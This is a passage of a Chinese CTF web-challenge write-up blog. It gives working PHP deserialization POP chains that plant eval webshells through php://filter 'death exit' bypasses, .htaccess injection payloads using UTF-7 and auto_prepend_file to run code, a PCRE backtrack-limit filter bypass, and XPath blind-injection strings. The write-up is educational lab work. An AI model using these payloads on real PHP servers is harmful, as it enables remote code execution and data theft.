<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . uniqid() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$cache_filename</span>, -strlen(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache_filename</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>$cache_filename=$this-&gt;options[&#39;prefix&#39;].uniqid().$name</code>组成随机的文件名。这里options[‘prefix’] 和 $name  可控。可以用../变成upload/1345235(uniqid)/../1.php 绕过**<br><strong>判断 $cache_filename 文件名最后三位是否是php结尾</strong><br><strong>这里可以用1.php/.绕过</strong></p>
<blockquote>
<p><strong>file_put_contents(‘1.php/.’,’123’)会生成1.php而不是1.php/.</strong></p>
</blockquote>
<blockquote>
<p><strong><code>$this-&gt;options[&#39;prefix&#39;] . uniqid() . $name</code>生成随机文件名uploads/48342/../1.php/.会在uploads目录生成1.php。</strong></p>
</blockquote>
<p><strong>知识点二：死亡exit 绕过</strong></p>
<blockquote>
<p>$data = “<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n” . $data;</p>
</blockquote>
<p>如何绕过p神的<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank">文章</a>讲的很详细了，不过这里作为笔记还是记录以下</p>
<p>我们可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$data</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
<p>，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>所以，当<code>$data</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">&#x27;/../shell.php/.&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="keyword">array</span>(<span class="string">&#x27;path&#x27;</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;dirname&#x27;</span>=&gt;base64_encode(<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&#x27;serialize&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A()));</span><br></pre></td></tr></table></figure>


<p>还有一种解法是直接在$data就是文件内容里直接写要仔细的命令，通过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_numeric(<span class="variable">$data</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$serialize</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);                </span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在该方法中直接将serialize 赋值为system ,进行命令执行</p>
<p><strong>本地测试如下：</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu45.jpg"></p>
<p>发现思路是正确的</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;`cat /flag &gt; ./uploads/flag.php`&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    ];	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A()));</span><br></pre></td></tr></table></figure>
<p>看了大佬的wp发现还有一种做法是</p>
<p>先写一个 .user.ini，然后写一个 .jpg 里面带马，使其追加到其他 php 后面作为 php 执行</p>
<p>参考链接：<a href="https://guokeya.github.io/post/2020-xin-chun-hong-bao-ti-fan-xu-lie-hua-pop-lian/" target="_blank">新年红包题1</a></p>
<h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>.htaccess配置</strong></li>
<li>php.ini </li>
<li><strong>\n</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码量较少，主要走了如下的限制</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">删除当前目录除了<span class="meta">index</span>.php以外所有文件 </span><br><span class="line">包含fl3g.php，访问后可以发现此文件不存在 </span><br><span class="line">content经过stristr不能含有<span class="meta">on</span>, html, type, flag, upload, <span class="meta">file</span></span><br><span class="line"><span class="meta">filename</span>经过preg_match只能含有[a-z.] </span><br><span class="line">删除当前目录除了<span class="meta">index</span>.php以外所有文件 </span><br><span class="line">写入内容为content名为<span class="meta">filename</span>的文件 ,最后还会有\n换行追加数据导致.htaccess解析错误的限制 </span><br></pre></td></tr></table></figure>
<p>而且这里比较让我们值得注意的是<code>fl3g.php</code>的包含，虽然每次都会首先执行删除当前目录下所有的文件，但是之后又都会去尝试包含<code>fl3g.php</code>，那我们是不是可以有什么操作去写入<code>fl3g.php</code>呢？</p>
<p>我们把写入文件的功能点放在<code>.htaccess</code>上来</p>
<p><strong>通过查看php.ini 配置文档，发现几个可利用的地方</strong></p>
<ul>
<li><strong><code>error_log</code>可以把<code>error_reporting</code>设置的错误等级写入到设置的文件当中，这个看起来我们可以利用该函数来就进行报错写入文件</strong></li>
<li><strong><code>include_path</code>可以指定<code>include</code>等包含函数包含的环境路径</strong></li>
</ul>
<p><strong>我们大概可以有这么个思路：</strong></p>
<p>error_log可以将php运行报错的记录写到指定文件中。</p>
<p>我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将payload作为一个路径去访问时就会因为找不到fl3g.php而报错，这个时候，include_path也就是我们的payload就会写入到我们刚刚设置报错信息的error_log =  /tmp/fl3g.php文件中去。这个时候我们再将include_path的内容设置成/tmp,即可让index.php能够包含<code>/tmp/fl3g.php</code>,即读取我们的报错信息</p>
<p><strong>首先先考虑如何绕过\n换行追加数据导致.htaccess解析错误的限制</strong> </p>
<p><strong>我们可以利用<code>#</code>注释符将整句话都注视掉，但是又由于有<code>\n</code>换行符的存在，我们不能直接使用<code>#</code>就将其注释掉，需要把<code>\n</code>进行“吃”掉。那么最常见的操作就是利用<code>\</code>斜杠将其转义了，这样<code>\\n</code>就是一个简单的<code>\n</code>字符串了。</strong></p>
<p>初步构造.htaccess文件内容如下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path <span class="string">&quot;payload&quot;</span> </span><br><span class="line">php_value error_log <span class="regexp">/tmp/</span>fl3g.php</span><br><span class="line"><span class="comment">#\</span></span><br></pre></td></tr></table></figure>


<p><strong>不过令人失望的是 error_log的内容默认是<code>htmlentities</code>的,我们无法插入类似<code>&lt;?php phpinfo();?&gt;</code>的payload，因为&lt; &gt;等会被转义，我们需要绕过，这里利用UTF-7绕过</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu46.jpg"></p>
<p>先尝试利用 UTF-7 编码我们需要插入的恶意代码，写入<code>.htaccess</code>的文件内容如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php_value</span> include_path &#x27;+ADw?php die(eval($_GET[<span class="number">2</span>]))+ADs +AF<span class="number">8</span>AXw-halt+AF<span class="number">8</span>-compiler()+ADs&#x27;</span><br><span class="line"><span class="attribute">php_value</span> error_log /tmp/fl<span class="number">3</span>g.php</span><br><span class="line"><span class="comment">#\</span></span><br></pre></td></tr></table></figure>
<p>payload1：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?filename=.htaccess&amp;content=php_value+error_log+%<span class="number">2</span>ftmp%<span class="number">2</span>ffl<span class="number">3</span>g.php%<span class="number">0</span>aphp_value+include_path+%<span class="number">22</span>%<span class="number">2</span>bADw%<span class="number">3</span>fphp+eval(%<span class="number">24</span>_GET%<span class="number">5</span>b<span class="number">1</span>%<span class="number">5</span>d)%<span class="number">2</span>bADs+%<span class="number">2</span>bAF<span class="number">8</span>AXw-halt%<span class="number">2</span>bAF<span class="number">8</span>-compiler()%<span class="number">2</span>bADs%<span class="number">22</span>%<span class="number">0</span>a%<span class="number">23</span>+%<span class="number">5</span>c</span><br></pre></td></tr></table></figure>
<p>上传之后，来到<a target="_blank" rel="noopener" href="http://url/index.php,%E4%BD%BF%E5%BE%97%E8%A7%A6%E5%8F%91%60.htaccess%60%EF%BC%8C%E5%B0%86%60.htaccess%60%E4%B8%AD%E7%9A%84%60payload%60%E5%86%99%E9%81%93%60/tmp/fl3g.php%60%E4%B8%AD%E3%80%82">http://url/index.php,使得触发`.htaccess`，将`.htaccess`中的`payload`写道`/tmp/fl3g.php`中。</a></p>
<p>第二步 再把以下内容写入<code>.htaccess</code>：，从而显示报错信息</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path <span class="string">&#x27;/tmp&#x27;</span></span><br><span class="line">php_value zend.<span class="keyword">multibyte </span><span class="number">1</span></span><br><span class="line">php_value zend.<span class="keyword">script_encoding </span><span class="string">&quot;UTF-7&quot;</span></span><br><span class="line"><span class="comment">#\</span></span><br></pre></td></tr></table></figure>
<p>payload2：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?filename=.htaccess&amp;content=php_value+include_path+%<span class="number">22</span>%<span class="number">2</span>ftmp%<span class="number">22</span>%<span class="number">0</span>aphp_value+zend.multibyte+<span class="number">1</span>%<span class="number">0</span>aphp_value+zend.script_encoding+%<span class="number">22</span>UTF-<span class="number">7</span>%<span class="number">22</span>%<span class="number">0</span>a%<span class="number">23</span>+%<span class="number">5</span>c</span><br></pre></td></tr></table></figure>
<p>上传后，直接修改url为<a target="_blank" rel="noopener" href="http://url/?1=var_dump(file_get_contents(&#39;/flag&#39;)">http://url/?1=var_dump(file_get_contents(&#39;/flag&#39;)</a>);</p>
<p>即可看到报错信息</p>
<p>还有一种解法是</p>
<p><strong>用<code>\</code>来转义换行符来绕过最后加一行的限制。 所以同理也可以用<code>\</code>来绕过stristr处的所有限制。型如</strong></p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line"><span class="keyword">le</span> <span class="string">&quot;.htaccess&quot;</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value%<span class="number">20</span>auto_prepend_fil\%<span class="number">0</span>ae%<span class="number">20.</span>htaccess%<span class="number">0</span>a%<span class="number">23</span><span class="meta">&lt;?php</span>%<span class="number">20</span>system(<span class="string">&#x27;cat%20/fl[a]g&#x27;</span>);<span class="meta">?&gt;</span>\</span><br></pre></td></tr></table></figure>


<p>解法三：</p>
<p>手册中还允许设置 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.backtrack-limit">pcre.backtrack_limit</a> ，这个可以更改正则回溯的次数，具体可以参考 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
<p>这里我们看到题目的代码正则部分是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Hacker2&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <strong>这里是判断是否为 1 ，如果为 1 则 die ，而根据正则回溯，当超过回溯次数，<code>preg_match</code>会返回<code>false</code>，自然就可以绕过了。</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php_value</span> pcre.backtrack_limit <span class="number">0</span></span><br><span class="line"><span class="attribute">php_value</span> pcre.jit <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>所以我们可以先上传以上内容到<code>.htaccess</code>，利用这个回溯特性可以绕过 filename 的检测</strong></p>
<p>payload</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?content<span class="operator">=</span>php_value<span class="variable">%20</span>pcre.backtrack_limit<span class="variable">%200</span><span class="variable">%0</span>aphp_value<span class="variable">%20</span>pcre.jit<span class="variable">%200</span><span class="variable">%0</span>a<span class="variable">%23</span>\&amp;filename<span class="operator">=</span>.htaccess</span><br></pre></td></tr></table></figure>


<p>没有preg_match的waf后就可以通过php://filter伪协议写入一句话  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//</span>filter<span class="regexp">/write=convert.base64-decode/</span>resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;<span class="number">1</span>=phpinfo(); </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>知识点：这一题的话就是找注入点要细心，抓包，F12看Network等等，js文件要注意</p>
<p>找到注入点后sqlmap 一把梭</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu47.jpg"></p>
<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p>知识点：<strong>XPATH注入</strong></p>
<p><a href="https://xz.aliyun.com/t/7791#toc-0" target="_blank">XPATH注入学习</a></p>
<p><strong>Xpath注入漏洞验证：</strong></p>
<p>加一个 ‘ ;有下列报错，则可以确定Xpath注入的存在性</p>
<p>xpath盲注适用于攻击者不清楚XML文档的架构，没有错误信息返回，一次只能通过布尔化查询来获取部分信息，同样以0x05中的源码为例</p>
<p><strong>Xpath盲注步骤：</strong></p>
<ul>
<li><strong>判断根节点下的节点数</strong></li>
<li><strong>判断根节点下节点长度&amp;名称</strong></li>
<li><strong>…..</strong></li>
<li><strong>重复猜解完所有节点，获取最后的值</strong></li>
</ul>
<p><strong>从根节点开始判断：</strong></p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or count(/)=1  or &#x27;</span><span class="string">&#x27;=&#x27;</span>     ###根节点数量为<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;or count(/*)=1 or &#x27;</span><span class="string">&#x27;=&#x27;</span>   ##根节点下只有一个子节点</span><br></pre></td></tr></table></figure>
<p><strong>判断根节点下的节点长度为8：</strong></p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="keyword">or</span> <span class="built_in">string</span>-<span class="built_in">length</span>(<span class="built_in">name</span>(/*[<span class="number">1</span>]))=<span class="number">8</span> <span class="keyword">or</span> &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>猜解根节点下的节点名称：</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span><span class="keyword">a</span><span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>c<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">..</span><br><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 8, 1)=&#x27;</span>s<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>猜解出该节点名称为accounts</strong></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or count(/accounts)=1  or &#x27;&#x27;=&#x27;   /accounts节点数量为<span class="number">1</span></span><br><span class="line">&#x27;or count(/accounts/user/*)&gt;0 or &#x27;&#x27;=&#x27;     /accounts下有两个节点</span><br><span class="line"></span><br><span class="line">&#x27;or string-length(name(/accounts/*[1]))=4  or &#x27;&#x27;=&#x27;    第一个子节点长度为<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>猜解accounts下的节点名称：</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/*[1]), 1, 1)=&#x27;</span><span class="string">u&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/*[1]), 4, 1)=&#x27;</span><span class="string">r&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>accounts下子节点名称为user</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or count(/accounts/user)=2  or &#x27;</span><span class="string">&#x27;=&#x27;</span>    <span class="keyword">user</span>节点有两个，则可以猜测出accounts节点结构，accounts下两个节点，均为<span class="keyword">user</span>节点</span><br></pre></td></tr></table></figure>
<p><strong>第一个user节点的子节点长度为8：</strong><br>*<em>‘or string-length(name(/accounts/user[position()=1]/</em>[1]))=8 or ‘’=’**</p>
<p><strong>读取user节点的下子节点</strong></p>
